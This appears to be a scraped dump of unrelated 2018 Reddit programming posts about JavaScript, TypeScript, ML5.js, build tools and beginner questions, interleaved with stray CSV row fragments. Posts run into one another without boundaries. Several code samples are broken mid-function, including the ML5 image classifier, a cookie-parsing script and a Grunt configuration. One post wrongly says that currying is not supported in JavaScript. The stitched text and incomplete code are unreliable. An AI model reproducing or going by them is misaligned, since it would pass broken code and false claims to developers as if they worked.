Further, you can go for Angular, React or Vue. These are the three popular front-end frameworks. If you’re just starting in web dev. It’s best to go for Angular, for the same reason as Express.js. Larger community, lots of tutorials and good resources. For beginners it’s best. Learning Angular would give you an overall knowledge of front-end development. You will get familiar with MVC framework. Angular is more extensive than React or Vue.   


For this, again, you can use **edWisor.** Learn Angular while working on live projects.   


Overall, to become a full-stack Javascript developer, proceed this way: Javascript—&gt; Node.js / Express.js  ( building APIs)—&gt; databases (Postgresql/MySQL/noSQL/ MongoDB) —&gt; setting up server —&gt; AWS—&gt; Angular/ React / Vue.    


There you have it-- a complete roadmap to become a full-stack Javascript developer.

I recently made a subreddit word cloud visualization and thought I would share it with the community. For those who don't know, a word cloud is a cloud of words where font size corresponds to frequency. First, I used Reddit's [PRAW API](https://praw.readthedocs.io/en/latest/index.html) to parse comments and filtered the words using [NLTK](https://www.nltk.org/). Then, I used D3 to create the visualization along with the help of [Jason Davies' d3-cloud module](https://github.com/jasondavies/d3-cloud). For example, here is an image when running my module on r/javascript over the past month: [https://imgur.com/pNa7RO0](https://imgur.com/pNa7RO0)

So now, if you want to develop a web application, you don’t need to use a different language for server-side development. Node.js lets you use JavaScript for server-side programming.

Now we can use JavaScript for frontend development, backend development, and also using plain JavaScript, you can perform database operations in MongoDB. You don’t need to use SQL.

So JavaScript can be used to develop all aspects of an application — this is why it’s known as full-stack JavaScript.

Full-stack JavaScript also refers to the MEAN stack. M stands for MongoDB, E for Express, A for Angular, and N stands for Node.js.

I have been Experimenting with ML5.js for sometime now, I would Like to share my leanings with the community.

![img](px3r08d4yef11)

**ML⁵.js**   is a recently developed high level Library which aims to make machine   learning approachable for a broad audience of artists, creative coders,   and students. The Library is developed at the **New York University and**   has been publicly released on \*\*July 2018.\*\*The library provides  access  to machine learning algorithms ,task and models in the browser,   building on top of  [TensorFlow.js](https://js.tensorflow.org/)with no other external dependencies.So, It can be compared to Keras. [**ML⁵.js**](https://ml5js.org/) is built over [TensorFlow.js](https://js.tensorflow.org/)and it uses the functionality of [TensorFlow.js](https://js.tensorflow.org/)at the backend but makes life easier for people who are new to Machine Learning arena.

![img](bx7h0je9yef11)

[**ML⁵.js**](https://ml5js.org/) is built with a Motive to simplify things out for beginners. We can compare this to [Keras](https://keras.io/).   The Motivation behind Keras was to make ML/DL in python so Simple that   it can be used by Beginners. Similar is the case with ML⁵.js..

This   is possible by making a wrapper around the Tensorflow.js library and   use all the functionality at the backend. So Intuitively, It is an Easy   to use API for TensorFlow.js.

## Getting Started with ML⁵.js

We can use [**ML⁵.js**](https://ml5js.org/) by  Referencing the [latest version](https://unpkg.com/ml5@0.1.1/dist/ml5.min.js) of it in our project, by just using a script tag in an HTML file as below:

    &lt;html&gt;
    &lt;head&gt;
      &lt;title&gt;Getting Started&lt;/title&gt;
    
               &lt;script src=""https://unpkg.com/ml5@0.1.1/dist/ml5.min.js""&gt;&lt;/script&gt;
    
        &lt;/head&gt;
       &lt;body&gt;
      &lt;script&gt;
           // Your code will go here
         &lt;/script&gt;
       &lt;/body&gt;
    &lt;/html&gt;

That’s all! 💥

You are ready to go..

Please Consider watching this Video for Detailed explanation on ML5.js :-

r/[https://youtu.be/D1jxmyQwM1A](https://youtu.be/D1jxmyQwM1A)

## Promises and Callbacks

[**ML⁵.js**](https://ml5js.org/) supports both **error-first callbacks** and Promises in all methods.

## Using Callbacks

**ML⁵.js** uses a pattern referred to as an **error-first callback**:

**For example —**  if you are using the \*\*imageClassifier()\*\*method, you will need to construct it in the following way:

    // Pass a callback function to constructor   
    const classifier = ml5.imageClassifier('MobileNet', function(err, model) {        
    
         console.log('Model Loaded!');     
     
    }       
    
    // Make a prediction with the selected image and pass a callback function with two arguments   
    classifier.predict(image, function(err, results) {       
     
         // Check for errors. If no errors, then do something with the results       
    
    });

Error first callbacks is a convention common to many JavaScript libraries that is implemented in **ML⁵.js**. The language JavaScript itself does not enforce this pattern. Before implementation, we need to understand that most **ML⁵.js** methods and functions are asynchronous ( *because machine learning models can take significant amounts of time to process inputs and generate outputs!).*

## Using Promises

[**ML⁵.js**](https://ml5js.org/) also supports [Promises](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise). If no callback is provided to any asynchronous function then a Promise is returned.

With Promises, the image classification example can be used in the following way:

// No callback needs to be passed to use Promises.

    ml5.imageClassifier('MobileNet')     
      .then(classifier =&gt; classifier.predict(image))    
      .then(results =&gt; {     
           
           // Do something with the results        
     });

## Image Classification Using ML⁵.js - An Example Casestudy

## imageClassifier()

**ML⁵.js**   can use neural networks to recognize the content of images.   ml5.imageClassifier()is a default method to create an object that   classifies an image using a pre-trained models like MobileNet etc.

The **ML⁵.js** library accesses these model from the cloud. 

**Let us build a concrete example:-**

We will use the p5 Library along with **ML⁵.js.** p5 is a Powerful yet simple library to use in Javascript.You can find more details [here.](https://p5js.org/) You can always use Vanilla JavaScript or other frame works of your choice with [**ML⁵.js.**](https://ml5js.org/)

Before we start with the Javascript part,We will need to host a local server using NodeJS. 

**Below is the Code:-**

    let express = require(""express"");  
    let app = express();  
         
    app.use(function(req, res, next){    
          console.log(`${new Date()} - ${req.method} reqest for ${req.url}`);    
         next();  
     }); 
          
    app.use(express.static(""../local""));      
     
    app.listen(8081, function(){   
          console.log(""Serving at 8081"")   
    });

After the Local server is Successfully up and Running, We can start off with the coding of HTML and JS files.

             console.error(err)

            //log the result    
            console.log(res);  
      
            //get the label from the JSON result   
           let label = res[0].className;     
       
            //get the probablity from the JSON result   
           let prob = res[0].probability;  
         
           //creation of DOM and printing the label and probability    
           fill(0);

           createP(prob);   
        
          }  
     }

# My Take on ML5.js

This is excellent for coders who are familiar with JavaScript &amp; HTML and are trying to find their way in the ML/DL world!

It   makes things a lot simpler for people coming from a non-ML/DL   background, but who are looking to understand this field.It makes   machine learning approachable for a broad audience of artists, creative   coders, and students.

The use cases for this are many, and I personally think it’s something we need at the moment.

new Swift learner here.

Yesterday I was looking up some material to learn Swift. I found 3 different books in the iBook Store where I'm wondering what the difference is (especially from 2 of these books).

One book is called ""Intro to App Development with Swift"" and the other one is called ""App Development with Swift"". How are they different from each other? In the book's description they sound like they both cover the basics so which to take?

Unfortunately, service workers do not support partial content, so videos must fit in memory to be cached correctly. Our devices often have less than 2 gigs of memory, and some of our customers want to showcase 8K video. In order to get around this limitation, I looked for a solution that would allow me to stream chunks of the video, and append them together using javascript, then feed the appended content to the video element. I also want to be able to continue to append the content after the video starts playing, as forcing our customers to wait for the video to fully download would be a poor experience.

**What I want to do** \- I'm using ClickFunnels (built with RoR) and I need to get some values from a cookie and pass them as parameters of a query string link inside a button and an image.

I'm pretty new to javascript so I might be missing something obvious, however the folks on freenode couldn't help with my issue. The code below works as expected on *Google Chrome Version 68.0.3440.106 (Official Build) (64-bit)*. This is the only version I could run this code as I expected.

On the latest version of Google Chrome (both desktop and mobile) and Firefox, the code does not work as I expected.

    		// store cookie in var
    		var insCookie = document.cookie;

    		var cookieObj = {}
    		// iterates through the resulting array
    		// for each arr el =&gt; trim() =&gt; split on ""="" =&gt; store each key-value pair on an object

    		{
    	    // do step 3
    			//trim

    			// split on ""=""
    			var cookieKVArr = cookieKV.split(""="");
    
    			// store kv on obj
    			cookieObj[cookieKVArr[0]] = cookieKVArr[1];
    		}
    		return cookieObj;
    	}
    // starts to use what we got stored
    	var obj = getCookie();
    	var button = document.querySelectorAll(""a.elButton"");
    	var my_btn = button[0];
    	var href = my_btn.href;
    // Starts to generate new button url based on cookie data
    	href = href.replace(/#prod_geo#/g,obj.prod_geo).replace(/#prod_name#/g,obj.prod_name).replace(/#subprod_name#/g,obj.subprod_name).replace(/#offer_name#/g,obj.offer_name).replace(/#offer_device#/g,obj.offer_device);
      function ChangeUrl() {
        $(""a[href*='#prod_geo#']"").attr(""href"",href);
      };
      var img = document.querySelectorAll(""img.elIMG"");
      var my_img = img[1];
      var img_href = my_img.dataset.imagelink;
    // Starts to generate new img url based on cookie data
      var new_img_href = img_href.replace(/#prod_geo#/g,obj.prod_geo).replace(/#prod_name#/g,obj.prod_name).replace(/#subprod_name#/g,obj.subprod_name).replace(/#offer_name#/g,obj.offer_name).replace(/#offer_device#/g,obj.offer_device);

      ChangeUrl();
      // change url for the image
      my_img.dataset.imagelink = new_img_href;
      };

**The problem** \- what happens is that, once the page loads completely, the browser redirects automatically to the link within the button/image. The parameters get sent as it should, but I don't want to automatically redirect the user, I just want to build the link as it should be once the user click on the button/image.

**My thoughts** \- I'm guessing that the problem is when I change the parameters on the image. The browser does not redirect automatically if I change only the parameters on the button (and don't even mention the image on the code). So I must be doing some wrong when I manipulate the dataset.imagelink. I could not find any information that would instruct me on this matter.

**Other considerations** \- This is my first attempt of doing anything with javascript so bear with me. Also, I have no control over how the html elements are built so I just need to deal with what I already have. One last thing, if you need more information, please let me know.

Background story:

My brother runs a visa service shop for chinese visas in Austria. He started in January and manually filling out [these forms](http://www.chinaembassy.at/det/qz/vbsg/P020130905778982923978.pdf) is really tedious, especially doing it for other people is, so he asked me if I can make him a online form that transforms the raw values to that populated multi page pdf, because the chinese consulate understandably only accepts these.

&amp;#x200B;

So 8 months later, here we are, it's finished. Creating a multilingual online form with payment checkout stuff and dynamically shown fields based on several conditions in React already was a deadening task, but the actual big thing was transforming that mess into a print-ready filled out pdf form. I did this with Google's Cloud Functions using imagemagick's convert command to merge the previously created png pages, which were created by drawing the values at specific coordinates on a canvas. So that is that.

&amp;#x200B;

Why am I posting this? I want to make this open source. At the moment, the code is split up into many parts throughout three platforms, two modules and two git repos and obviously not generically usable because it was made for that particular use case.

&amp;#x200B;

So, how should I do it? Also code-wise, what should I start with? I really want to make this an open source thing, but I don't even know the scope yet. Should it be a whole library that creates html forms for you and out comes a pdf on submit or should it just take a json file, yada yada yada.

# Functional Programming

## Basic Concepts

### 1. Purity

An idea that functions in programming shouldn’t have side effects and should instead behave like functions in mathematics. A mathematical function is a type of equation that has at least one independent variable and one dependent variable, such as:

    y = x + 5
    f(x) = x + 5
    f(2) = 2 + 5
    f(2) = 7

where there is only one value of y for each value of x, and it is always the same. So no matter how many times you pass the number 2 to f(x), you will always end up with 7.

### 2. Immutability

An idea that we shouldn’t use variables — values that can change. Instead we should use constants, values that cannot change. Although we might still call them “variables” because that’s an established term, they are variables in name only, as they cannot variate. For our purposes this means that we must create a new constant every time we need to store a value.

This is the same as in math, where you can’t do something like 

    x = x + 1

Instead you would do
    
    y = x + 1

### 3. (a) Functions as first class citizens

A first class citizen in a programming language is any sort of entity that supports all of the operations that are commonly available to other entities. This means that for a function to be a first class citizen it has to be able to be treated as a value. In JavaScript we can assign functions to variables or perform operations on them, where the result of that function’s execution will be used when the operation runs.

### 3. (b) Higher order functions 

A higher order function is a function that can can accept other functions as parameters and also return functions as results. Once again this is possible because functions are first class citizens in JavaScript.

### 4. Closures

A closure is a function that resides inside another function, and has access to the parent function’s variables. This is because a function remembers the environment (scope) in which it was created. As such it can use the variables of that scope even after the scope itself was destroyed.

    function foo() {
      const x = 5;
      function bar() {
        console.log(x + 2);
      }
      setTimeout(() =&gt; { bar() }, 2000);
    }

Here `bar()` runs 2 seconds after `foo()` was last used. It’s entirely possible that `foo()` has already been deleted from memory by a garbage collector, and yet `bar()` remembers the value of `x` — a variable that was declared within the scope of `foo()` and disappeared with it.

### 5. Referential transparency 

Any function should be able to be replaced by what it would return when it runs. If we have a function `foo()` that returns a number (5 for example) there should be no difference between writing

    const x = foo() * 2;

and

    const x = 5 * 2;

This goes back to the idea of Purity, where a function should always return the same result if given the same input, and should not have any side effects.

### Examples: 

    .map() .reduce()

Generally these are not applicable. If you are dealing with these, you are probably way more advanced that the people for whom this write up was meant. I'm including them here just to provide definitions, so that if new developers see these terms in some other tutorials they would know what is being talked about.

### 1. Currying 

A pattern that was developed to compensate for the shortcomings of really old languages that only supported a single parameter per function. Now used out of habit and not actually supported by JS. When people speak of currying in JS they really just mean using closures.

### 2. Function composition

A pattern one would use if one wanted to prevent the consumers of the code from chaining top-level functions and potentially shooting themselves in the foot. Composed functions would only expose themselves and then enforce the sequence of operations.",Functional Programming: a quick and simple explanation. (repost from /r/learnjavascript)

([Here's how it looks](https://imgur.com/PovCq6p))

-----------------

### My main question is: How should I set up the model for the data in the text file?

- Should I use a struct with fields like 

        var question: String
        var optionA: String
        var optionB: String
        var optionC: String
        var optionD: String
        var optionE: String


- Or should I instead use a dictionary set up as:

        var dictionary: [String: String] = [
            ""question"": """",
            ""a"": """",
            ""b"": """",
            ""c"": """",
            ""d"": """",
            ""e"": """"
        ]

- Either way, assuming I read the file line by line, how should I be separating the question from the option? 
    - Would it make sense to use regular expressions and assume it's an option if the start of the line begins with a letter followed by a `.`? (regex: `^[a-ZA-Z]+\.`)

- Is this a task that can be solved in a much easier way (or is already solved) in another language / service?
    - Is there something in python / javascript that completes this task?

1933,2018-09-04 15:44:59,2,2,"I am building a web app that allows users to build data analysis models using a limited set of variables and deploy these models to apply the parameters on IoT streaming data and generate triggers.

I am a computer engineer but I have not done any software engineering/ web development in the past 5 years. Given the myriad options available these days for almost every aspect of web apps, I am feeling trapped with severe analysis paralysis.

The app components are such:
1. A fairly large historical IoT data store for multiple devices and different frequencies (minimum frequency 1 minute going upto daily data for past 5  years) - The only operations that I need on this store are append and selection of a slice of continuous data for a particular time period. Will a nosql database like mongodb or AWS Dynamodb work well enough for this scenario? Database size split across distinct devices would be a maximum of 40 gb. 
2. I need a frontend to let users build analysis models using upto 5 canned variables/ formulas (out of a total 70-80) and enter required inputs for these formulas. For the MVP, I will build this using basic forms and some lightweight and easy to learn javascript framework (recommendations welcome). For version 2.0/3.0 I will maybe evaluate Typeform level interactiveness / pizzazz.  For simple models, I am also evaluating a parser library which parses the user input (in one giant textbox), scans for the syntax and buids python code on the server. Any parsing libraries / lexers which are easy to customize for a particular set of keywords and rules?
3. Once a user builds a model, she can ‘backtest’ the model on historical data to see if the results are promising. This part of the process can take more than 30 seconds to compute and is done in python on the back end. For this I have evaluated AWS lambda functions (for natural concurrency), lambda with frameworks such as Zappa/ chalice, celery queue with rabbitmq/ Redis broker and saving the result in sql/ nosql database and displaying the same to the user front end. Given computation heaviness of the process, what architecture / approach works better? 
4. Once a backtest is satisfactory, user can choose to deploy the model which would mean that for each ‘tick’ of IoT data, formulas (from #2 above) needs to be calculated. Once the signal criteria is hit, user needs to be alerted (email/ sms via twilio or AWS ses). For the scheduled tasks - deployed models, would simple cron scale to running thousands of tasks on a single shared virtual server. Or this is the usecase for AWS lambda? Or should I reuse celery #3.

Users I am expecting - between 100 and 1500 monthly active users primarily active during IoT data streaming hours (6 hours everyday, 5 days a week)

Hosting net expenses - I want to start with no more than $20-30 per month, willing to go up as the proportion of paying users increase. Hence, need easy scalability with zero or as little devops as required. What I have briefly considered are the following:
AWS Elastic Beanstalk, AWS lambda (Zappa), DigitalOcean (vanilla, dokku, nanobox), Heroku (expensive). I need basic deployment features (easy rollbacks) if possible on the starting budget.

My idea to streamline the creation of these templates is to create a bunch of pug components and place them in the components/ directory. Outside of the components directory I want to make higher level pug templats that utilize the components. Once  these have been created, I would build it with NPM and the template files need to be converted to HTML and placed within the /dist folder.

1939,2018-09-06 10:57:01,0,5,"Few days ago I published my [flex layout designer](http://www.csstutorial.org/flex-both.html) software. To my surprise, it had a pretty good reception.

Today, (again, after staying up all night) I added a new feature. The ability to simultaneously scale an item vertically as it is being dragged. I applied a patch to the site, so it is now fully available to play around with.

I just published my first ever [JavaScript tutorial](http://www.javascriptteacher.com/how-to-make-flex-layout-designer-in-javascript.html) posted to personal domain name (I usually write a on Medium, but the paywall is an annoyance, since I can't freely really share my work with everyone there, and their article format isn't really that great for source code examples) explaining line by line how it was created, with fully commented source code.

It is all vanilla JavaScript code (no libraries of frameworks, with exception a bit of jQuery for very simple tasks, mainly to simplify the syntax of the dinosauric calls such as document.getElementById...) And for displaying that initiial blinking flex item animation, which strategically communicates to the visitor that yes the flex box is interactive.

My goal was to create a tutorial that explained the actual process behind writing a JavaScript application using classes. Most of the JavaScript tutorials I read show how to use a language feature. Not how to actually program apps with the language. And hopefully, down the road, this will help someone.

I am sure some of the techniques I use can be critiqued and I know that it's not perfect code. But its bug-less (to my knowledge.) And it works. It gets the thing done.",Coding Flex Layout Designer in JavaScript (with complete source code)
1940,2018-09-06 13:54:07,0,0,"Most teams don't get their estimates right. And that included us too! 🙈

So, we set out to solve this issue by reading, talking to other people, and trying out different solutions ourselves.

Today, I can say our method works well for our team and we're able to get our estimates more accurately, which has has helped our team a lot. 🎉

Here's what we do and these are our key takeaways👇🏼

**1. Allocate enough time to estimate**

Often times, product managers can fall into the trap of prioritizing a list of features, go to their team and say, “*We need to ship this, this, and this, by the end of next month*”, when in reality it would take them four months to build it without any issues or bugs.

But when deadlines come from the top, developers aren't given the freedom to come up with the right estimate, but are rather pressured to meet the deadline. When they're forced to meet the deadline, most developers are just going to come up with estimates just to please the manager.

&amp;#x200B;

**2. Break it down**

*""When you haven’t thought about what you’re going to do, you can’t know how long it will take.""*

*\~ Joel Spolsky, CEO of Stack Overflow*

&amp;#x200B;

**3. Group Tasks Under Buckets And Research:**

There are different types of tasks you'll have to consider while estimating.

&amp;#x200B;

**a. Known tasks:**  
These are tasks for which you have knowledge of all the ins and outs of what is required to execute efficiently.

  
**b. Partially known tasks:**

You have some knowledge on how to execute on these tasks, but need guidance or require to research further to confidently execute.

&amp;#x200B;

**c. Unknown tasks:**

These are tasks that will require you to spend anywhere between an hour to at least half a day to understand the technology

&amp;#x200B;

The goal here is to research and move all your ""Partially Known Tasks"" and ""Unknown Tasks"" to ""Known Tasks"" bucket.

&amp;#x200B;

**4. Re-estimate**

[The Cone of Uncertainity](https://en.wikipedia.org/wiki/Cone_of_Uncertainty) is a popular concept that states that the more uncertain you are about how to implement a project, the more uncertain your estimates will be. Plus, while re-estimating, our team often were able to think of different aspects of the task that they originally hadn't thought of and were able to eliminate unexpected delays.

&amp;#x200B;

While coming up with this process, we made few mistakes and we found that it's important to keep 4 cases in mind while estimating:

A. Watch out for the ""Just"" tasks. These are usually tasks that we say will take just a few minutes or it'll take only half an hour. But we've found that these are usually the ones that end up taking long time. 

&amp;#x200B;

B. Don't let the manager estimate. While managers usually come up with the spec and requirements, developers are always in the best position to know what libraries they might have to use and what kind of complexities they might run into. 

&amp;#x200B;

C. Don't forget the miscellaneous tasks like code review, migration, and the time it'll take to deploy.

&amp;#x200B;

D. Consider unexpected delays like public holidays, bugs showing up like an unwelcome guest to a house party, and falling sick.

&amp;#x200B;

This is the process we've come up in our team and it works for us. We've [written about it](https://blog.zepel.io/project-estimation/?utm_source=reddit&amp;utm_medium=community&amp;utm_campaign=javascript&amp;utm_content=estimates) in detail too, but I'd love to hear your thoughts, suggestions, and learn what processes you use in your team to get your estimates more accurate.",How to estimate projects with more accuracy

I'm using TypeScript 3.0, writing declaration files. I have this problem where I'm typing to strongly type a javascript Pick function that picks only keys from the object which are specified in the rest parameter (array of property names).

     pick (source, ...keys) {

I'm curious specifically if I can completely strongly type this, so that the type system can infer the rest parameter/array of prop names, and will only return me the object with those properties. 

    pick({ prop1: 'test', prop2: 'test', prop3: 'test' }, ""prop1"", ""prop2"");
    
// Return type inferred as { prop1: 'test', prop2: 'test' }

I'm aware of the Pick, however this doesn't work with an array of object property names. I'm basically trying to see if its possible to rewrite Pick to do this (at the bottom).

    // Current standard lib type implementation of Pick
    type Pick&lt;T, K extends keyof T&gt; = {
        [P in K]: T[P];

1947,2018-09-07 12:02:21,16,12,"Hello TypeScript community!

I'm writing typings for a framework, I'm specifically interested in strongly typing these functions for the typings (let's also call it a learning exercise) and I'm using TypeScript 3.0 FYI. I have the following problems, I think it is currently not possible in TypeScript to achieve what I want to do. Maybe one of you wizards can prove me wrong? :)

&amp;#x200B;

\###  valuesOf(obj)

The JavaScript implementation:

\`\`\`javascript

values (obj) {

return \_.keys(obj).map(key =&gt; obj\[key\]);

}

\`\`\`

I want to make this type-safe, so that the return type can be inferred as a type literal:

\`\`\`typescript

declare function values&lt;Obj&gt;(obj: Obj): \[ ??? \];

&amp;#x200B;

const valuesOfResult = values({ prop1: 1, prop2: 2, prop3: 3 }); // Should infer return type as type literal \[ 1, 2, 3 \];

\`\`\`

&amp;#x200B;

I'm pretty sure you can't do this, my first thoughts were creating a mapped type to grab just the object values, but that would return an object, not the array of type literal values.

&amp;#x200B;

\###  Object.assign

This ones more of a curiosity. The standard lib has the following signature for Object.assign.

\`\`\`typescript

assign&lt;T, U&gt;(target: T, source: U): T &amp; U;

\`\`\`

However it seems we can do a bit better than that with a conditional type:

\`\`\`typescript

export type Assign&lt;Source extends object, Target extends object&gt; = {

  \[Key in keyof (Source &amp; Target)\]: Key extends keyof Source &amp; keyof Target ? Target\[Key\] : Key extends keyof Target ? Target\[Key\] : Key extends keyof Source ? Source\[Key\] : never;

}

&amp;#x200B;

// Can be used like so

const assignResult = assign({ testOne: 1, testTwo: 1 }, { testThree: 3, testTwo: """" });

/\*\* Return type is {

testOne: number;

testTwo: string;

testThree: number;

} \*/

\`\`\`

How come the standard libs implementation is ""T &amp; U"" ? The conditional type version appears to have better inference so is there any benefit to the ""T &amp; U"" version?

&amp;#x200B;

\###  isObjectEmpty(obj)

&amp;#x200B;

I've checked everywhere and it seems this isn't possible yet in TypeScript, but I'm looking for  a fully type safe isObjectEmpty(obj) function. The JavaScript implementation.

&amp;#x200B;

\`\`\`javascript

isObjectEmpty (obj) {

return \_.keys(obj).length === 0;

}

\`\`\`

&amp;#x200B;

How I would like to be implemented in TypeScript, again returning a type literal.

\`\`\`

\`\`\`typescript

declare function isObjectEmpty&lt;Obj&gt;(obj: Obj): obj is {}; // Doesn't work as expected

&amp;#x200B;

const isObjectEmptyResult = isObjectEmpty({}); // Should return boolean type literal 'true'

const isObjectEmptyResult2 = isObjectEmpty({ test: 1 }); // Should return boolean type literal 'false';

const isObjectEmptyResult3 = isObjectEmpty(1234); // Should return boolean type literal 'false'

Does anyone know of a good transpiler that will do this for us? We have huge classes with lots of corner cases, big property objects and everything. While the process is quite easy, it is really tedious. 

Thanks in advance!



PS:
These are the parts that we use:
	
	var Class = {
		create: function () {
			return function () {
				this.initialize.apply(this, arguments);
			}
		}
	}

	Object.extendsObject = function (destination, source) {
		destination = Object.clone(destination.prototype);

		for (var property in source) {
			destination[property] = source[property];
		}
		return destination;
	}

	Object.clone = function (obj) {
		var clone = Class.create();

		for (var property in obj) {
			clone[property] = obj[property];
		}

		return clone;
	}

Extending a built-in objec like Object, already is a great idea. But we go even further. Either we overwrite the objects prototype with a new ojbect, which never causes any problems at all, or when doing inheritance, we just destroy the prototype chain. Genius move.
Using this library also gives us goodies like:
    &gt; Dog.prototype
    ƒ () {
        this.initialize.apply(this, arguments);
    }

    &gt; var d = new Dog(); d.constructor;
    ƒ Function() { [native code] }

We can't move to anything past ES5, because our JavaScript engine doesn't support it. Hell, we've had support for ES5 for about 1.5 years now.",Transpiling PrototypeJS Classes to ES5

**TL;DR** During the last 3 nights, pretty much 10 hours on end, I've worked on this JavaScript Grid layout editor:

Link: [Grid Layout Editor](http://www.csstutorial.org/grid-layout-editor.html) written in 100% vanilla JavaScript (no frameworks or libraries were used.)

*Processing gif uco2fu5datm11...*

Lessons learned:

Sometimes you get to this point, where you just know you feel like giving up. But that's the exact time you have to find courage and push forward even if it means staying up all night. If you don't, you might not complete an important feature, because focus will be lost.

I didn't have to add knob sliders ""that bump into each other"" at all. It's hard to implement, and was some of the most complex cod I have written to date, but these details really make a difference on end result!

Each layer of features enables you to take another step forward. For example, rescaling of all items was implemented first. Then I implemented ""knobs bumping"" into each other. Only then I added grid cell array with numbers.

My goal is to create a visual grid slicer that can also generate CSS grid source code. (But can also work independently in vanilla JavaScript.)

One of the next features I plan on adding:

1. In-grid flex editor for each cell's content. I already created a JavaScript flex editor class that can be instantiated - already available on the site - so it's not a far fetched idea.
2. Gaps (like CSS grid)
3. Copy CSS grid version source code to clipboard (so, technically a css grid generator.)

I like to make free apps, in hope that I can create accessible education tools for everyone who needs them.

More than twice already I've had people contact me saying some of my work is used in schools. . . odd.

Building free online tools has always been fascinating, for some reason.

Just doing this for fun and hopefully it helps someone out there.","I created this interactive grid layout editor in JavaScript, that allows you to slice and dice a virtual grid."

Its been around for a while. I decided to give it a try.  Don't be put off by the need to use a specific version of nodejs - I was able to use the latest nodejs.

I successfully built a downloadable Electron Python app called Print42 with this technology - check it out at https://print42.herokuapp.com/.  Print42 is a modern thermal printer based ""ticker tape"" for tailing log files.  A bit of an unusual application perhaps but that's a long story...

Print42 features display tape font size options (that were implemented in CSS), search and filtering. You can also annotate the printout with text fragments that you type or screenshots that you paste in.  Actually I believe having a (silent when idle) thermal printer on each programmer's desk is a productivity booster - not just for log files but for printing all sorts of screen-grabs that can be written on and studied.  Sometimes you just need a pen to think through a problem.

I found that communicating between the GUI and Python using remote procedure calls is not ideal, however its pretty easy and on the bright side, arguably encourages clean partitioning of your app into UI vs business logic.

The ability to leverage my existing html and javascript skills to build a UI was priceless.

2009,2018-09-27 05:28:37,25,10,"Sorry for the long title, I just needed to add a bit of context. I'm new to programming, almost 3 months into this and I absolutely love it much more than what I was doing previously. 

I just finished a project and wanted to minify all of the .css and .js files and put them in a folder that will be used by my view files for rendering, without having to do all of that manually, I'm sure most of you have a similar script but I figured I'd share mine, it's at the end of this post. 

So basically, considering I'm trying to become a programmer one day, I wanted to challenge myself and find a way to automatize this process, somehow finding a way to minify every corresponding .js or .css file inside of my javascript and stylesheet folders. 

I went on and did some research (more like googled and read through about 30 tabs) then fortunately found out how to do it using grunt and various plugins. It's a pretty cool script I just wrote, it watches every single file change, upon detecting a change it minifies the file into a folder where all my minified files are (be it javascript files or CSS files, these two are separated in two different folders, also), and then nodemon restarts the app, I don't have to do anything! It also skips files that were not changed so that the process of minifying thse files doesn't takes too long and I can reset the page fast. 

This way if I have any problems with the styling or with any script, I can just modify the unminified versions and after every single save the watch task will run, minify the scripts and put them in my assets or public folder which is the one uploaded to the cloud on deployment. Another cool feature is that if I create a new file, I don't have to manually add it to anywhere since the task scan the whole folders looking for .js or .css files, respectively.

This results in my project having all of its files minified on production, while at the same time I'm able to keep working on the unminified versions without any limitation or having to do any manual minifying or whatever, which is very tedious. 

Sounds awesome, right? Well, after finishing this script, I researched a bit more and found out about Gulp and Webpack, then about a bunch of other tools and topics, information is just spread out so much I don't know what conclusions to make out of all that, all I could conclude is that is that apparently Grunt is outdated. So my question is: as a beginner, which tools should I focus on learning and why? Do any of these tools have usage outside of JavaScript? Like Java, or C#?

-------------------

Here's my Grunt script for those interested, there's some DRY code but I'll refactor it some other day:

          // Create a target Using the verbose ""target: {src: src, dest: dest}"" format.
          cssmin[relpath] = {
            src: cssPath.join(cssSrcpath, relpath),

        });

2010,2018-09-27 08:41:06,7,20,"What if ... it could be possible to chain all your day to day javascript tools without the need of a task manager ?

In my frontend dev experiences, I spent a lot of time looking to find the best task manager providing me the smoothest experience ; from Gulp, Grunt to Brunch, Taskr then Parcel. We are always aware of the goddamn new tool to make our bundling, transpiling, formating, linting, testing experience the simplest as possible.

But I need to be a little bit more pragmatic. I understand the differences between bundlers and task manager, and this is not the purpose at all.

Talking about Webpack, Rollup, and Parcel, they are all three bundlers at start, but are doing ""transformation"" jobs callings other tools you'll use on your own : Babel, Bublé, Prettier, Jest, etc...

Seeking arround alot before to find an ""only press enter"" experience, I handled up with a lot of task manager, to finally end with the NPM scripts.

And, with some others Hyperapp contributos I met. I realized, the thing we all wanted was only to peform multiple tasks in sequence on files.

In the terminal world (mostly Linux) this thins is performed smoothly by using the pipe operator |  
. And here it is!

What if ... it could be possible to chain all your day to day javascript tools without the need of a task manager, only using the terminal pipe operator ?

    cat src/app.js | rollup | babel | uglify &gt; dist/app.js 

This way, we will be able to avoid the use of a complex task manager we dont want, because we will be able to only use the NPM scripts.

It is a pretty huge post, uh. And a rough draft of my thoughts. I think I would love to gather some feedbacks first.

I dont know if it will stay as an idea, or if I would make it more concrete, by making some wrappers maybe.

    cat src/app.js | piped-rollup | piped-babel | piped-uglify &gt; dist/app.js 

Or by trying to team up to make a PR squads on all our day to day tools.

I could be pretty utopist. By the way, thanks for your reading, and I hope you will leave some comments.",The Pipe and the CLI : Javascript tools edition

2-Get another random character from string(not the previous one as characters should not repeat), insert it into that new string.

3-Repeat steps 1 and 2 until a new string of length equal to given string is formed.

2029,2018-10-01 17:33:08,2,1,"Hey Guys,


I've been dabbling in the programming world for about 3 months now. I've completed the HTML and CSS and a little of the javascript courses on Codeacademy as well as Udemy, and recently finished creating a fake website for my father's arcade. While it was fun and I learned a lot, it felt a little restricting. I don't know that I want to be a web developer and create websites for a living. I was looking at other languages and came across Python. It was right up my alley. You can automate, create databases, web sites, and so much more that I'm sure I'm not aware of. 


The way I learned the most when learning css and html was getting my hands dirty and creating the website.


So heres my idea: I love league of legends. But I almost love looking at my game stats more. I will visit op.gg to look at my stats and see where I need to improve. I want to create my own statveiwer. I think this is doable, as the websites I visit pull from RIOTs servers and display the information. I believe I would have to learn api and data management, however I think this would be a fun project to do. 

Before I get started I wanted to post here and see if anyone has done something similar or has any advice on the best way to get started. I would eventually want to have the data converted into graphs and charts, so I'm sure I'd have to learn R, unless theres a better alternative. 

Looking forward to any experience or advice you can share.

I'm a graphic designer making a cards based online portfolio, when someone click on a card, another windows appears to showcase the project with more infos, pic, etc. 

I want to change the position of a serie of elements (and choose which one is visible too but I'll probably make it if I can resolve the first issue), when I click on another element.

